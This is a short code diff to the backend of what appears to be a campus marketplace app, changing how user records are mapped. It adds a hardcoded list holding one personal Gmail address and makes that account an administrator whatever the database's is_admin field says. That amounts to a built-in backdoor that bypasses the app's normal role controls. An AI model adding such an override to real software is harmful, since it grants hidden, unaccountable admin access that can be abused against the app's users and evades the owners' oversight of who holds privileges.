@@ -179,7 +179,8 @@ async function seedModerator() {
 
 /* ---------------- row mappers ---------------- */
 const USER_COLS = "id,name,email,role,location,bio,avatar,is_admin,rating,ratings_count,listings,sold,reviews,created_at,email_verified";
-
+// Emails in this list are always treated as admin, no matter what is_admin says in the DB.
+const HARDCODED_ADMIN_EMAILS = ["lunacoder22@gmail.com"];
 function cleanUser(row) {
   if (!row) return null;
   return {
@@ -190,7 +191,7 @@ function cleanUser(row) {
     location: row.location || "Main Campus",
     bio: row.bio || "",
     avatar: row.avatar || "",
-    isAdmin: !!row.is_admin,
+    isAdmin: !!row.is_admin || HARDCODED_ADMIN_EMAILS.includes(String(row.email || "").trim().toLowerCase()),
     rating: row.rating != null ? Number(row.rating) : 0,
     ratingsCount: row.ratings_count || 0,
     listings: row.listings || 0,
